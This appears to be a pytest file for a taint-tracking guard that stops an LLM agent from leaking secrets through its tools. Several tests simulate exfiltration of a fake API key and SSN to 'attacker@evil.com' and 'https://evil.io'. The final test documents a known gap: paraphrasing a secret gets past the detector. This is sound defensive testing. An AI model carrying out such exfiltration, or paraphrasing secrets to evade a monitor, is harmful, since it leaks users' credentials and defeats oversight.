"""Tests for content-based taint propagation across the LLM boundary.

Validates the fix for the core GUARD limitation: labels don't survive the LLM
round-trip, so we track sensitive CONTENT and re-taint it when it reappears.
"""

import pytest

from lucin.aifg import Confidentiality, IFCLabel, Integrity
from lucin.guard.ifc_runtime import UNTRUSTED_PUBLIC, UNTRUSTED_SECRET, IFCPolicy
from lucin.guard.interceptor import GuardBlockError, GuardSession, guard_tool
from lucin.guard.taint_registry import TaintRegistry

SECRET = IFCLabel(Integrity.UNTRUSTED, Confidentiality.SECRET)
PUBLIC = IFCLabel(Integrity.UNTRUSTED, Confidentiality.PUBLIC)


# ---------------------------------------------------------------------------
# Unit: TaintRegistry
# ---------------------------------------------------------------------------

def test_registry_ignores_public_data():
    reg = TaintRegistry()
    added = reg.register("the weather is sunny in San Francisco today", PUBLIC)
    assert added == 0
    assert reg.size == 0


def test_registry_tracks_secret_and_detects_verbatim():
    reg = TaintRegistry()
    reg.register("APIKEY=sk-live-abcd1234efgh5678", SECRET, source_id="tool:read_secret")
    label, srcs = reg.scan("please use APIKEY=sk-live-abcd1234efgh5678 to authenticate")
    assert label is not None
    assert label.confidentiality >= Confidentiality.INTERNAL
    assert "tool:read_secret" in srcs


def test_registry_detects_ssn_substring():
    reg = TaintRegistry()
    reg.register("name=Alice ssn=123-45-6789 dob=1990", SECRET)
    label, _ = reg.scan("exfil payload: 123-45-6789")
    assert label is not None


def test_registry_no_match_on_unrelated_text():
    reg = TaintRegistry()
    reg.register("APIKEY=sk-live-abcd1234efgh5678", SECRET)
    label, srcs = reg.scan("completely unrelated benign message about lunch")
    assert label is None
    assert srcs == []


def test_registry_short_tokens_not_tracked():
    # Short common words must not become taint sources (FP guard).
    reg = TaintRegistry()
    reg.register("the cat sat", SECRET)   # all tokens < min length
    label, _ = reg.scan("the dog ran")    # shares 'the' but too short to track
    assert label is None


# ---------------------------------------------------------------------------
# Integration: multi-hop exfil through the (simulated) LLM boundary
# ---------------------------------------------------------------------------

def test_verbatim_exfil_blocked_across_llm_boundary():
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_secret")
    def read_secret(k):
        return "SSN:123-45-6789 APIKEY=sk-live-abcd1234efgh5678"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="send_email")
    def send_email(to, body):
        return "sent"

    # Guarded tools return the REAL value (not a Tainted wrapper); taint is
    # tracked out-of-band in the registry. The LLM re-emits it as a plain string.
    llm_relayed = read_secret("db")
    assert isinstance(llm_relayed, str)

    with pytest.raises(GuardBlockError):
        send_email("attacker@evil.com", llm_relayed)


def test_partial_secret_substring_blocked():
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_secret")
    def read_secret(k):
        return "user record: name=Alice ssn=123-45-6789 dob=1990-01-01"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="http_post")
    def http_post(url, data):
        return "ok"

    read_secret("x")
    with pytest.raises(GuardBlockError):
        http_post("https://evil.io", "exfil: 123-45-6789")


def test_benign_egress_not_falsely_blocked():
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="web_search")
    def web_search(q):
        return "Top result: Python is a programming language."

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="send_email")
    def send_email(to, body):
        return "sent"

    res = web_search("python")
    # No secret was ever read; benign content out must be allowed.
    out = send_email("team@company.com", res)
    assert out is not None


def test_content_taint_can_be_disabled():
    # With content_taint off, the old label-only behaviour returns (documents
    # that the feature is what closes the gap).
    session = GuardSession(policy=IFCPolicy("t"), content_taint=False)

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_secret")
    def read_secret(k):
        return "APIKEY=sk-live-abcd1234efgh5678"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="send_email")
    def send_email(to, body):
        return "sent"

    secret = read_secret("db")
    # No content taint → the relayed plain string is not re-tainted → allowed.
    out = send_email("attacker@evil.com", secret)
    assert out is not None


# ---------------------------------------------------------------------------
# HONEST LIMIT: transformed (non-verbatim) secrets are NOT caught
# ---------------------------------------------------------------------------

def test_transformed_secret_is_a_known_gap():
    """Content taint catches VERBATIM propagation, not LLM-transformed secrets.

    This test documents the limit honestly: if the LLM paraphrases the secret
    ('the key begins with sk-live') instead of copying it, content matching
    misses it. Catching that needs the plan-based (CaMeL) approach we can't do
    without controlling the model. We assert the CURRENT behaviour so the gap
    is visible and tracked, not hidden.
    """
    session = GuardSession(policy=IFCPolicy("t"))

    @guard_tool(session, label=UNTRUSTED_SECRET, tool_name="read_secret")
    def read_secret(k):
        return "APIKEY=sk-live-abcd1234efgh5678"

    @guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="send_email")
    def send_email(to, body):
        return "sent"

    read_secret("db")
    # The LLM describes the secret instead of copying it verbatim.
    transformed = "the API key starts with sk and is 20-ish characters long"
    out = send_email("attacker@evil.com", transformed)
    # KNOWN GAP: this is currently allowed. If a future plan-based layer closes
    # it, flip this assertion.
    assert out is not None
